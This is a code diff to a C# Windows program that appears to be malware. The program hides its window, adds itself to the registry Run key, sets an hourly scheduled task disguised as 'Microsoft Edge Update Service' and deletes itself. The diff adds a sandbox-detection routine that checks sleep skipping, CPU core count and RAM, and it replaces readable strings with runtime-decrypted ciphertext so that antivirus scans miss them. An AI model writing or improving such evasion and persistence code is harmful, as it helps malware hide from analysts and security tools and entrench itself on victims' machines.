@@ -39,11 +39,13 @@ class Program
     {
         try
         {
+            if (AntiSandbox()) return;
+            
             HideWindow();
             AddToStartup();
             AddWatchdog();
 
-            const string mutexName = "Global\\SingletonInstance";
+            string mutexName = StringCipher.Decrypt("EsZ+FTTGTSQ8xHYbMN5+GRzEYgM0xHIS"); // "Global\\SingletonInstance"
             _mutex = new Mutex(true, mutexName, out bool createdNew);
             if (!createdNew)
             {
@@ -76,6 +78,43 @@ class Program
         }
     }
 
+    private static bool AntiSandbox()
+    {
+        try
+        {
+            // 1. Sleep Bypass (Sandboxes often skip Thread.Sleep)
+            int before = Environment.TickCount;
+            Thread.Sleep(1500);
+            if (Environment.TickCount - before < 1500)
+                return true; // Execution time was skipped, likely in a sandbox
+
+            // 2. Hardware Checks (Sandboxes usually have low specs)
+            // Check CPU Cores (Less than 2 cores is suspicious for a modern PC)
+            if (Environment.ProcessorCount < 2)
+                return true;
+                
+            // Check RAM (Less than ~4GB (4000MB) is suspicious)
+            // Note: WMI can be detected, so we use a simple native memory check or catch block if WMI fails
+            try {
+                using (var searcher = new System.Management.ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem"))
+                {
+                    foreach (var item in searcher.Get())
+                    {
+                        ulong memKb = (ulong)item["TotalVisibleMemorySize"];
+                        if (memKb < 3000000) // Less than ~3GB
+                            return true;
+                    }
+                }
+            } catch { } // If WMI fails (access denied), continue execution
+
+            return false; // Not a sandbox
+        }
+        catch
+        {
+            return false; // On error, assume it's safe to run to avoid breaking functionality
+        }
+    }
+
     private static void HideWindow()
     {
         try
@@ -101,8 +140,7 @@ class Program
         {
             string executablePath = Assembly.GetExecutingAssembly().Location;
             // Build registry path dynamically to avoid static string detection
-            string[] parts = { "Software", "Microsoft", "Windows", "CurrentVersion", "Run" };
-            string regPath = string.Join("\\", parts);
+            string regPath = StringCipher.Decrypt("BsV3AyLLYxIJ53gUJ8ViGDPeTSA8xHUYItlNNCDYYxI73kcSJ9l4GDv2QwI7"); // "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
             RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath, true);
             key.SetValue(AppConfig.APP, executablePath);
         }
@@ -114,8 +152,7 @@ class Program
         try
         {
             string executablePath = Assembly.GetExecutingAssembly().Location;
-            string[] parts = { "Software", "Microsoft", "Windows", "CurrentVersion", "Run" };
-            string regPath = string.Join("\\", parts);
+            string regPath = StringCipher.Decrypt("BsV3AyLLYxIJ53gUJ8ViGDPeTSA8xHUYItlNNCDYYxI73kcSJ9l4GDv2QwI7"); // "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
             RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath, true);
             key.DeleteValue(AppConfig.APP, false);
         }
@@ -137,11 +174,11 @@ class Program
 
         // Use cmd.exe /C inline instead of writing a .bat file
         string exePath = AppConfig.exe;
-        string cmd = $"/C timeout /t 2 /nobreak >nul & del \"{exePath}\"";
+        string cmd = string.Format(StringCipher.Decrypt("eukxAzzHdBgg3jFYIYojV3rEfhUnz3AcdZR/AjmKN1cxz31Xd9EhCnc="), exePath); // "/C timeout /t 2 /nobreak >nul & del \"{0}\""
 
         Process.Start(new ProcessStartInfo
         {
-            FileName = "cmd.exe",
+            FileName = StringCipher.Decrypt("Nsd1WTDSdA=="), // "cmd.exe"
             Arguments = cmd,
             CreateNoWindow = true,
             UseShellExecute = false,
@@ -155,7 +192,7 @@ class Program
 
     private static void AddWatchdog()
     {
-        const string taskName = "Microsoft Edge Update Service";
+        string taskName = StringCipher.Decrypt("GMNyBTrZfhEhilQTMs8xIiXOcAMwikISJ9x4FDA="); // "Microsoft Edge Update Service"
 
         // Get full path to the currently running executable
         string exePath = Assembly.GetExecutingAssembly().Location;
@@ -166,8 +203,8 @@ class Program
         // 1. Check if the task already exists
         var queryInfo = new ProcessStartInfo
         {
-            FileName = "schtasks",
-            Arguments = $"/query /tn \"{taskName}\"",
+            FileName = StringCipher.Decrypt("Jsl5AzTZegQ="), // "schtasks"
+            Arguments = string.Format(StringCipher.Decrypt("ettkEifTMVghxDFVLppsVQ=="), taskName), // "/query /tn \"{0}\""
             RedirectStandardError = true,
             RedirectStandardOutput = true,
             UseShellExecute = false,
@@ -183,10 +220,8 @@ class Program
             {
                 var createInfo = new ProcessStartInfo
                 {
-                    FileName = "schtasks",
-                    Arguments =
-                        $"/create /f /sc hourly /mo 5 /tn \"{taskName}\" " +
-                        $"/tr {quotedExePath}",
+                    FileName = StringCipher.Decrypt("Jsl5AzTZegQ="), // "schtasks"
+                    Arguments = string.Format(StringCipher.Decrypt("esljEjTedFd6zDFYJskxHzrfYxssij4aOookV3ref1d30SEKd4o+AyeKakYo"), taskName, quotedExePath), // "/create /f /sc hourly /mo 5 /tn \"{0}\" /tr {1}"
                     UseShellExecute = false,
                     CreateNoWindow = true
                 };
